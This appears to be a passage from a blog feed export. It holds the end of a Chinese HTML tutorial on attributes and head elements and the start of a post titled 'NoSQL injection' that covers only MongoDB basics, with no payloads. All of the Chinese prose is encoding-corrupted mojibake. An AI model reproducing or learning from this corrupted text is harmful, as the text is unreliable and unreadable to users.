<p><strong>title</strong>ï¼šä¸ºå…ƒç´ æä¾›é¢å¤–çš„æç¤ºä¿¡æ¯ï¼Œé€šå¸¸åœ¨é¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºã€‚</p>
<pre><code class="highlight plaintext">&lt;abbr title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/abbr&gt;</code></pre>

<p>**data-***ï¼šç”¨äºå­˜å‚¨è‡ªå®šä¹‰æ•°æ®ï¼Œé€šå¸¸é€šè¿‡ JavaScript è®¿é—®ã€‚</p>
<pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot;&gt;User Info&lt;/div&gt;</code></pre>

<h3 id="ç‰¹å®šå…ƒç´ çš„å±æ€§"><a href="#ç‰¹å®šå…ƒç´ çš„å±æ€§" class="headerlink" title="ç‰¹å®šå…ƒç´ çš„å±æ€§"></a>ç‰¹å®šå…ƒç´ çš„å±æ€§</h3><p>æŸäº›å±æ€§ä»…é€‚ç”¨äºç‰¹å®šçš„ HTML å…ƒç´ ã€‚</p>
<p>**<code>href</code>**ï¼ˆç”¨äº <code>&lt;a&gt;</code> å’Œ <code>&lt;link&gt;</code> å…ƒç´ ï¼‰ï¼šæŒ‡å®šé“¾æ¥çš„ç›®æ ‡ URLã€‚</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;Visit Example&lt;/a&gt;</code></pre>

<p>**<code>src</code>**ï¼ˆç”¨äº <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code> ç­‰å…ƒç´ ï¼‰ï¼šæŒ‡å®šå¤–éƒ¨èµ„æºçš„ URLã€‚</p>
<pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre>

<p>**<code>alt</code>**ï¼ˆç”¨äº <code>&lt;img&gt;</code> å…ƒç´ ï¼‰ï¼šä¸ºå›¾åƒæä¾›æ›¿ä»£æ–‡æœ¬ï¼Œå½“å›¾åƒæ— æ³•æ˜¾ç¤ºæ—¶æ˜¾ç¤ºã€‚</p>
<pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre>

<p>**<code>type</code>**ï¼ˆç”¨äº <code>&lt;input&gt;</code> å’Œ <code>&lt;button&gt;</code> å…ƒç´ ï¼‰ï¼šæŒ‡å®šè¾“å…¥æ§ä»¶çš„ç±»å‹ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your name&quot;&gt;</code></pre>

<p>**<code>value</code>**ï¼ˆç”¨äº <code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code> ç­‰å…ƒç´ ï¼‰ï¼šæŒ‡å®šå…ƒç´ çš„åˆå§‹å€¼ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; value=&quot;Default Value&quot;&gt;</code></pre>

<p>**<code>disabled</code>**ï¼ˆç”¨äºè¡¨å•å…ƒç´ ï¼‰ï¼šç¦ç”¨å…ƒç´ ï¼Œä½¿å…¶ä¸å¯äº¤äº’ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre>

<p>**<code>checked</code>**ï¼ˆç”¨äº <code>&lt;input type=&quot;checkbox&quot;&gt;</code> å’Œ <code>&lt;input type=&quot;radio&quot;&gt;</code>ï¼‰ï¼šæŒ‡å®šå¤é€‰æ¡†æˆ–å•é€‰æŒ‰é’®æ˜¯å¦è¢«é€‰ä¸­ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;checkbox&quot; checked&gt;</code></pre>

<p>**<code>placeholder</code>**ï¼ˆç”¨äº <code>&lt;input&gt;</code> å’Œ <code>&lt;textarea&gt;</code> å…ƒç´ ï¼‰ï¼šåœ¨è¾“å…¥æ¡†ä¸­æ˜¾ç¤ºæç¤ºæ–‡æœ¬ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your email&quot;&gt;</code></pre>

<p>**<code>target</code>**ï¼ˆç”¨äº <code>&lt;a&gt;</code> å’Œ <code>&lt;form&gt;</code> å…ƒç´ ï¼‰ï¼šæŒ‡å®šé“¾æ¥æˆ–è¡¨å•æäº¤çš„ç›®æ ‡çª—å£æˆ–æ¡†æ¶ã€‚</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot;&gt;Open in new tab&lt;/a&gt;</code></pre>

<h3 id="å¸ƒå°”å±æ€§"><a href="#å¸ƒå°”å±æ€§" class="headerlink" title="å¸ƒå°”å±æ€§"></a>å¸ƒå°”å±æ€§</h3><p>å¸ƒå°”å±æ€§æ˜¯æŒ‡ä¸éœ€è¦å€¼çš„å±æ€§ï¼Œå®ƒä»¬çš„å­˜åœ¨å³è¡¨ç¤º trueï¼Œä¸å­˜åœ¨åˆ™è¡¨ç¤º falseã€‚</p>
<p><strong>disabled</strong>ï¼šç¦ç”¨å…ƒç´ ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre>

<p><strong>readonly</strong>ï¼šä½¿è¾“å…¥æ¡†åªè¯»ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; readonly&gt;</code></pre>

<p><strong>required</strong>ï¼šæŒ‡å®šè¾“å…¥å­—æ®µä¸ºå¿…å¡«é¡¹ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; required&gt;</code></pre>

<p>**<code>autoplay</code>**ï¼ˆç”¨äº <code>&lt;audio&gt;</code> å’Œ <code>&lt;video&gt;</code> å…ƒç´ ï¼‰ï¼šè‡ªåŠ¨æ’­æ”¾åª’ä½“ã€‚</p>
<pre><code class="highlight plaintext">&lt;video src=&quot;video.mp4&quot; autoplay&gt;&lt;/video&gt;</code></pre>

<h3 id="è‡ªå®šä¹‰å±æ€§"><a href="#è‡ªå®šä¹‰å±æ€§" class="headerlink" title="è‡ªå®šä¹‰å±æ€§"></a>è‡ªå®šä¹‰å±æ€§</h3><p>HTML5 å¼•å…¥äº† <strong>data-*</strong> å±æ€§ï¼Œå…è®¸å¼€å‘è€…è‡ªå®šä¹‰å±æ€§æ¥å­˜å‚¨é¢å¤–çš„æ•°æ®ã€‚</p>
<p>**data-***ï¼šç”¨äºå­˜å‚¨è‡ªå®šä¹‰æ•°æ®ï¼Œé€šå¸¸é€šè¿‡ JavaScript è®¿é—®ã€‚</p>
<pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot; data-role=&quot;admin&quot;&gt;User Info&lt;/div&gt;</code></pre>

<h3 id="äº‹ä»¶å¤„ç†å±æ€§"><a href="#äº‹ä»¶å¤„ç†å±æ€§" class="headerlink" title="äº‹ä»¶å¤„ç†å±æ€§"></a>äº‹ä»¶å¤„ç†å±æ€§</h3><p>HTML å…ƒç´ å¯ä»¥é€šè¿‡äº‹ä»¶å¤„ç†å±æ€§æ¥å“åº”ç‰¹å®šçš„äº‹ä»¶ï¼Œå¦‚ç‚¹å‡»ã€é¼ æ ‡æ‚¬åœç­‰ã€‚</p>
<p><strong>onclick</strong>ï¼šå½“ç”¨æˆ·ç‚¹å‡»å…ƒç´ æ—¶è§¦å‘ã€‚</p>
<pre><code class="highlight plaintext">&lt;button onclick=&quot;alert(&#x27;Button clicked!&#x27;)&quot;&gt;Click Me&lt;/button&gt;</code></pre>

<p><strong>onmouseover</strong>ï¼šå½“ç”¨æˆ·å°†é¼ æ ‡æ‚¬åœåœ¨å…ƒç´ ä¸Šæ—¶è§¦å‘ã€‚</p>
<pre><code class="highlight plaintext">&lt;div onmouseover=&quot;this.style.backgroundColor=&#x27;yellow&#x27;&quot;&gt;Hover over me&lt;/div&gt;</code></pre>

<p><strong>onchange</strong>ï¼šå½“å…ƒç´ çš„å€¼å‘ç”Ÿå˜åŒ–æ—¶è§¦å‘ã€‚</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; onchange=&quot;alert(&#x27;Value changed!&#x27;)&quot;&gt;</code></pre>

<h2 id="ä¸ºç½‘é¡µåŠ äº¿ç‚¹ç‚¹ç»†èŠ‚"><a href="#ä¸ºç½‘é¡µåŠ äº¿ç‚¹ç‚¹ç»†èŠ‚" class="headerlink" title="ä¸ºç½‘é¡µåŠ äº¿ç‚¹ç‚¹ç»†èŠ‚"></a>ä¸ºç½‘é¡µåŠ äº¿ç‚¹ç‚¹ç»†èŠ‚</h2><h3 id="æ°´å¹³çº¿"><a href="#æ°´å¹³çº¿" class="headerlink" title="æ°´å¹³çº¿"></a>æ°´å¹³çº¿</h3><p><code>&lt;hr&gt;</code> æ ‡ç­¾åœ¨ HTML é¡µé¢ä¸­åˆ›å»ºæ°´å¹³çº¿ã€‚</p>
<p><code>hr </code>å…ƒç´ å¯ç”¨äºåˆ†éš”å†…å®¹ã€‚</p>
<h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>å¯ä»¥å°†æ³¨é‡Šæ’å…¥ HTML ä»£ç ä¸­ï¼Œè¿™æ ·å¯ä»¥æé«˜å…¶å¯è¯»æ€§ï¼Œä½¿ä»£ç æ›´æ˜“è¢«äººç†è§£ã€‚æµè§ˆå™¨ä¼šå¿½ç•¥æ³¨é‡Šï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºå®ƒä»¬ã€‚</p>
<p>æ³¨é‡Šå†™æ³•å¦‚ä¸‹:</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<!-- è¿™æ˜¯ä¸€ä¸ªæ³¨é‡Š -->

<p><strong>æ³¨é‡Š:</strong> å¼€å§‹æ‹¬å·ä¹‹åï¼ˆå·¦è¾¹çš„æ‹¬å·ï¼‰éœ€è¦ç´§è·Ÿä¸€ä¸ªå¹å· <strong>!</strong> (è‹±æ–‡æ ‡ç‚¹ç¬¦å·)ï¼Œç»“æŸæ‹¬å·ä¹‹å‰ï¼ˆå³è¾¹çš„æ‹¬å·ï¼‰ä¸éœ€è¦ï¼Œåˆç†åœ°ä½¿ç”¨æ³¨é‡Šå¯ä»¥å¯¹æœªæ¥çš„ä»£ç ç¼–è¾‘å·¥ä½œäº§ç”Ÿå¸®åŠ©ã€‚</p>
<h3 id="å­—ä½“"><a href="#å­—ä½“" class="headerlink" title="å­—ä½“"></a>å­—ä½“</h3><h4 id="HTML-æ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾"><a href="#HTML-æ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾" class="headerlink" title="HTML æ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾"></a>HTML æ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾</h4><table>
<thead>
<tr>
<th align="left">æ ‡ç­¾</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><b></b></td>
<td align="left">å®šä¹‰ç²—ä½“æ–‡æœ¬</td>
</tr>
<tr>
<td align="left"><em>(å¤§å·æ–œä½“)</em></td>
<td align="left">å®šä¹‰ç€é‡æ–‡å­—</td>
</tr>
<tr>
<td align="left"><i></i></td>
<td align="left">å®šä¹‰æ–œä½“å­—</td>
</tr>
<tr>
<td align="left"><small></small></td>
<td align="left">å®šä¹‰å°å·å­—</td>
</tr>
<tr>
<td align="left"><strong>(åŠ ç²—)</strong></td>
<td align="left">å®šä¹‰åŠ é‡è¯­æ°”</td>
</tr>
<tr>
<td align="left"><sub></sub></td>
<td align="left">å®šä¹‰ä¸‹æ ‡å­—</td>
</tr>
<tr>
<td align="left"><sup></sup></td>
<td align="left">å®šä¹‰ä¸Šæ ‡å­—</td>
</tr>
<tr>
<td align="left"><ins>(ä¸‹åˆ’çº¿)</ins></td>
<td align="left">å®šä¹‰æ’å…¥å­—</td>
</tr>
<tr>
<td align="left"><del>(æ¨ªçº¿)</del></td>
<td align="left">å®šä¹‰åˆ é™¤å­—</td>
</tr>
</tbody></table>
<h4 id="HTML-â€œè®¡ç®—æœºè¾“å‡ºâ€-æ ‡ç­¾"><a href="#HTML-â€œè®¡ç®—æœºè¾“å‡ºâ€-æ ‡ç­¾" class="headerlink" title="HTML â€œè®¡ç®—æœºè¾“å‡ºâ€ æ ‡ç­¾"></a>HTML â€œè®¡ç®—æœºè¾“å‡ºâ€ æ ‡ç­¾</h4><table>
<thead>
<tr>
<th align="left">æ ‡ç­¾</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code></code></td>
<td align="left">å®šä¹‰è®¡ç®—æœºä»£ç </td>
</tr>
<tr>
<td align="left"><kbd></kbd></td>
<td align="left">å®šä¹‰é”®ç›˜ç </td>
</tr>
<tr>
<td align="left"><samp></samp></td>
<td align="left">å®šä¹‰è®¡ç®—æœºä»£ç æ ·æœ¬</td>
</tr>
<tr>
<td align="left"><var></var></td>
<td align="left">å®šä¹‰å˜é‡</td>
</tr>
<tr>
<td align="left"><pre></pre></td>
<td align="left">å®šä¹‰é¢„æ ¼å¼æ–‡æœ¬</td>
</tr>
</tbody></table>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125805549.png" alt="image-20250316125805549"></p>
<h4 id="HTML-å¼•æ–‡-å¼•ç”¨-åŠæ ‡ç­¾å®šä¹‰"><a href="#HTML-å¼•æ–‡-å¼•ç”¨-åŠæ ‡ç­¾å®šä¹‰" class="headerlink" title="HTML å¼•æ–‡, å¼•ç”¨, åŠæ ‡ç­¾å®šä¹‰"></a>HTML å¼•æ–‡, å¼•ç”¨, åŠæ ‡ç­¾å®šä¹‰</h4><table>
<thead>
<tr>
<th align="left">æ ‡ç­¾</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><abdr><acronym></acronym></abdr></td>
<td align="left">å®šä¹‰ç¼©å†™</td>
</tr>
<tr>
<td align="left"><address></address></td>
<td align="left">å®šä¹‰åœ°å€</td>
</tr>
<tr>
<td align="left"><bdo></bdo></td>
<td align="left">å®šä¹‰æ–‡å­—æ–¹å‘</td>
</tr>
<tr>
<td align="left"><blockquote></blockquote></td>
<td align="left">å®šä¹‰é•¿çš„å¼•ç”¨</td>
</tr>
<tr>
<td align="left"><q></q></td>
<td align="left">å®šä¹‰çŸ­çš„å¼•ç”¨è¯­</td>
</tr>
<tr>
<td align="left"><cite></cite></td>
<td align="left">å®šä¹‰å¼•ç”¨ã€å¼•è¯</td>
</tr>
<tr>
<td align="left"><dfn></dfn></td>
<td align="left">å®šä¹‰ä¸€ä¸ªå®šä¹‰é¡¹ç›®ã€‚</td>
</tr>
</tbody></table>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125715542.png" alt="image-20250316125715542"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316132652922.png" alt="image-20250316132652922"></p>
<h2 id="HTML-å¤´éƒ¨"><a href="#HTML-å¤´éƒ¨" class="headerlink" title="HTML å¤´éƒ¨"></a>HTML å¤´éƒ¨</h2><h3 id="HTML-base-å…ƒç´ "><a href="#HTML-base-å…ƒç´ " class="headerlink" title="HTML base å…ƒç´ "></a>HTML base å…ƒç´ </h3><p><code>&lt;base&gt;</code> æ ‡ç­¾æè¿°äº†åŸºæœ¬çš„é“¾æ¥åœ°å€/é“¾æ¥ç›®æ ‡ï¼Œè¯¥æ ‡ç­¾ä½œä¸ºHTMLæ–‡æ¡£ä¸­æ‰€æœ‰çš„é“¾æ¥æ ‡ç­¾çš„é»˜è®¤é“¾æ¥:</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.runoob.com/images/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<hr>
<h3 id="HTML-link-å…ƒç´ "><a href="#HTML-link-å…ƒç´ " class="headerlink" title="HTML  link å…ƒç´ "></a>HTML  link å…ƒç´ </h3><p><code>&lt;link&gt; </code>æ ‡ç­¾å®šä¹‰äº†æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºä¹‹é—´çš„å…³ç³»ã€‚</p>
<p><code>&lt;link&gt; </code>æ ‡ç­¾é€šå¸¸ç”¨äºé“¾æ¥åˆ°æ ·å¼è¡¨:</p>
<p>å¯ä»¥åœ¨å·¦ä¾§æ˜¾ç¤ºlogoç­‰å›¾ç‰‡</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;å›¾ç‰‡url&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªå¸¦å›¾ç‰‡çš„æ ‡ç­¾<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<hr>
<h3 id="HTML-style-å…ƒç´ "><a href="#HTML-style-å…ƒç´ " class="headerlink" title="HTML  style å…ƒç´ "></a>HTML  style å…ƒç´ </h3><p><code>&lt;style&gt;</code> æ ‡ç­¾å®šä¹‰äº†HTMLæ–‡æ¡£çš„æ ·å¼æ–‡ä»¶å¼•ç”¨åœ°å€.</p>
<p>åœ¨<code>&lt;style&gt; </code>å…ƒç´ ä¸­ä½ ä¹Ÿå¯ä»¥ç›´æ¥æ·»åŠ æ ·å¼æ¥æ¸²æŸ“ HTML æ–‡æ¡£:</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"> </span>
<span class="language-css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:yellow;&#125; </span>
<span class="language-css">    <span class="selector-tag">p</span> &#123;<span class="attribute">color</span>:blue&#125; </span>
<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<hr>
<h3 id="HTML-meta-å…ƒç´ "><a href="#HTML-meta-å…ƒç´ " class="headerlink" title="HTML meta å…ƒç´ "></a>HTML meta å…ƒç´ </h3><p>metaæ ‡ç­¾æè¿°äº†ä¸€äº›åŸºæœ¬çš„å…ƒæ•°æ®ã€‚</p>
<p><code>&lt;meta&gt; </code>æ ‡ç­¾æä¾›äº†å…ƒæ•°æ®.å…ƒæ•°æ®ä¹Ÿä¸æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œä½†ä¼šè¢«æµè§ˆå™¨è§£æã€‚</p>
<p>META å…ƒç´ é€šå¸¸ç”¨äºæŒ‡å®šç½‘é¡µçš„æè¿°ï¼Œå…³é”®è¯ï¼Œæ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ï¼Œä½œè€…ï¼Œå’Œå…¶ä»–å…ƒæ•°æ®ã€‚</p>
<p>å…ƒæ•°æ®å¯ä»¥ä½¿ç”¨äºæµè§ˆå™¨ï¼ˆå¦‚ä½•æ˜¾ç¤ºå†…å®¹æˆ–é‡æ–°åŠ è½½é¡µé¢ï¼‰ï¼Œæœç´¢å¼•æ“ï¼ˆå…³é”®è¯ï¼‰ï¼Œæˆ–å…¶ä»–WebæœåŠ¡ã€‚</p>
<p><code>&lt;meta&gt;</code> ä¸€èˆ¬æ”¾ç½®äº <code>&lt;head&gt;</code> åŒºåŸŸ</p>
<ul>
<li><code>&lt;meta&gt;</code> æ ‡ç­¾- ä½¿ç”¨å®ä¾‹</li>
</ul>
<p>ä¸ºæœç´¢å¼•æ“å®šä¹‰å…³é”®è¯:</p>
<pre><code class="highlight plaintext">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</code></pre>

<p>ä¸ºç½‘é¡µå®šä¹‰æè¿°å†…å®¹:</p>
<pre><code class="highlight plaintext">&lt;meta name=&quot;description&quot; content=&quot;å…è´¹ Web &amp; ç¼–ç¨‹ æ•™ç¨‹&quot;&gt;</code></pre>

<p>å®šä¹‰ç½‘é¡µä½œè€…:</p>
<pre><code class="highlight plaintext">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</code></pre>

<p>æ¯30ç§’é’Ÿåˆ·æ–°å½“å‰é¡µé¢:</p>
<pre><code class="highlight plaintext">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</code></pre>

<hr>
<h3 id="HTML-script-å…ƒç´ "><a href="#HTML-script-å…ƒç´ " class="headerlink" title="HTML script å…ƒç´ "></a>HTML script å…ƒç´ </h3><pre><code class="highlight plaintext">&lt;script&gt;æ ‡ç­¾ç”¨äºåŠ è½½è„šæœ¬æ–‡ä»¶ï¼Œå¦‚ï¼š JavaScriptã€‚

&lt;script&gt; å…ƒç´ åœ¨ä»¥åçš„ç« èŠ‚ä¸­ä¼šè¯¦ç»†æè¿°ã€‚</code></pre>

<hr>
<p><strong>æ€»ç»“:HTML head å…ƒç´ </strong></p>
<table>
<thead>
<tr>
<th align="left">æ ‡ç­¾</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><head></head></td>
<td align="left">å®šä¹‰äº†æ–‡æ¡£çš„ä¿¡æ¯</td>
</tr>
<tr>
<td align="left"><title></title></td>
<td align="left">å®šä¹‰äº†æ–‡æ¡£çš„æ ‡é¢˜</td>
</tr>
<tr>
<td align="left"><base></td>
<td align="left">å®šä¹‰äº†é¡µé¢é“¾æ¥æ ‡ç­¾çš„é»˜è®¤é“¾æ¥åœ°å€</td>
</tr>
<tr>
<td align="left"><link></td>
<td align="left">å®šä¹‰äº†ä¸€ä¸ªæ–‡æ¡£å’Œå¤–éƒ¨èµ„æºä¹‹é—´çš„å…³ç³»</td>
</tr>
<tr>
<td align="left"><meta></td>
<td align="left">å®šä¹‰äº†HTMLæ–‡æ¡£ä¸­çš„å…ƒæ•°æ®</td>
</tr>
<tr>
<td align="left"><script></td>
<td align="left">å®šä¹‰äº†å®¢æˆ·ç«¯çš„è„šæœ¬æ–‡ä»¶</td>
</tr>
<tr>
<td align="left"><style></td>
<td align="left">å®šä¹‰äº†HTMLæ–‡æ¡£çš„æ ·å¼æ–‡ä»¶</td>
</tr>
</tbody></table>
<blockquote>
<p>[!IMPORTANT]</p>
</blockquote>
<p>head æ ‡ç­¾ç”¨äºå®šä¹‰æ–‡æ¡£å¤´éƒ¨ï¼Œå®ƒæ˜¯æ‰€æœ‰å¤´éƒ¨å…ƒç´ çš„å®¹å™¨ã€‚<head> ä¸­çš„å…ƒç´ å¯ä»¥å¼•ç”¨è„šæœ¬ã€æŒ‡ç¤ºæµè§ˆå™¨åœ¨å“ªé‡Œæ‰¾åˆ°æ ·å¼è¡¨ã€æä¾›å…ƒä¿¡æ¯ç­‰ç­‰ã€‚</p>
<p>å¦‚ï¼š</p>
<pre><code class="highlight plaintext">&lt;html&gt;
  &lt;head&gt;
     &lt;title&gt;æ–‡æ¡£æ ‡é¢˜&lt;/title&gt;
  &lt;/head&gt;
&lt;/html&gt;</code></pre>

<p>header æ ‡ç­¾ç”¨äºå®šä¹‰æ–‡æ¡£çš„é¡µçœ‰ï¼ˆä»‹ç»ä¿¡æ¯ï¼‰ã€‚</p>
<p>å¦‚ï¼š</p>
<pre><code class="highlight plaintext">&lt;html&gt;
  &lt;body&gt;
    &lt;header&gt;
        &lt;p&gt;æ®µè½&lt;/p&gt;
        &lt;h1&gt;ä¸€çº§æ ‡é¢˜&lt;/h1&gt;
    &lt;/header&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>

<p>æ³¨æ„åƒä¸‡ä¸è¦å¼„æ··ã€‚</p>
</script></td></tr></tbody></table>]]></content>
      <tags>
        <tag>-HTML -Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title>Nosqlæ³¨å…¥</title>
    <url>/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="N0sql"><a href="#N0sql" class="headerlink" title="N0sql"></a>N0sql</h1><p>No only SQL,ç›®å‰æœ€æµè¡Œçš„nosqläº§å“æ˜¯MongoDB</p>
<p>ä¸€ç§æ•°æ®ç»“æ„ç”±é”®å€¼å¯¹ç»„æˆçš„æ–‡æ¡£</p>
<p>å’Œjsonç±»ä¼¼</p>
<pre><code class="highlight json"><span class="punctuation">&#123;</span>
    <span class="attr">&quot;_id&quot;</span> <span class="punctuation">:</span> ObjectId(<span class="string">&quot;60fa854cf8aaaf4f21049148&quot;</span>)<span class="punctuation">,</span>
    <span class="attr">&quot;name&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;whoami&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;description&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;the admin user&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;age&quot;</span> <span class="punctuation">:</span> <span class="number">19</span><span class="punctuation">,</span>
    <span class="attr">&quot;status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;A&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;groups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span>
        <span class="string">&quot;admins&quot;</span><span class="punctuation">,</span>
        <span class="string">&quot;users&quot;</span>
    <span class="punctuation">]</span>
<span class="punctuation">&#125;</span></code></pre>

<h2 id="MongoDB-åŸºç¡€æ¦‚å¿µè§£æ"><a href="#MongoDB-åŸºç¡€æ¦‚å¿µè§£æ" class="headerlink" title="MongoDB åŸºç¡€æ¦‚å¿µè§£æ"></a>MongoDB åŸºç¡€æ¦‚å¿µè§£æ</h2><p>ä¸ç®¡æˆ‘ä»¬å­¦ä¹ ä»€ä¹ˆæ•°æ®åº“éƒ½åº”è¯¥å­¦ä¹ å…¶ä¸­çš„åŸºç¡€æ¦‚å¿µï¼Œåœ¨ MongoDB ä¸­åŸºæœ¬çš„æ¦‚å¿µæœ‰æ–‡æ¡£ã€é›†åˆã€æ•°æ®åº“ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th>SQL æ¦‚å¿µ</th>
<th>MongoDB æ¦‚å¿µ</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>database</td>
<td>database</td>
<td>æ•°æ®åº“</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>æ•°æ®åº“è¡¨&#x2F;é›†åˆ</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>æ•°æ®è®°å½•è¡Œ&#x2F;æ–‡æ¡£</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>æ•°æ®å­—æ®µ&#x2F;åŸŸ</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>ç´¢å¼•</td>
</tr>
<tr>
<td>table joins</td>
<td></td>
<td>è¡¨è¿æ¥ï¼ŒMongoDB ä¸æ”¯æŒ</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>ä¸»é”®ï¼ŒMongoDB è‡ªåŠ¨å°† <code>_id</code> å­—æ®µè®¾ç½®ä¸ºä¸»é”®</td>
</tr>
</tbody></table>
<p>ä¸‹è¡¨åˆ—å‡ºäº†å…³ç³»å‹æ•°æ®åº“ RDBMS ä¸ MongoDB ä¹‹é—´å¯¹åº”çš„æœ¯è¯­ï¼š</p>
<table>
<thead>
<tr>
<th>RDBMS</th>
<th>MongoDB</th>
</tr>
</thead>
<tbody><tr>
<td>æ•°æ®åº“</td>
<td>æ•°æ®åº“</td>
</tr>
<tr>
<td>è¡¨æ ¼</td>
<td>é›†åˆ</td>
</tr>
<tr>
<td>è¡Œ</td>
<td>æ–‡æ¡£</td>
</tr>
<tr>
<td>åˆ—</td>
<td>å­—æ®µ</td>
</tr>
<tr>
<td>è¡¨è”åˆ</td>
<td>åµŒå…¥æ–‡æ¡£</td>
</tr>
<tr>
<td>ä¸»é”®</td>
<td>ä¸»é”®ï¼ˆMongoDB æä¾›äº† key ä¸º _idï¼‰</td>
</tr>
</tbody></table>
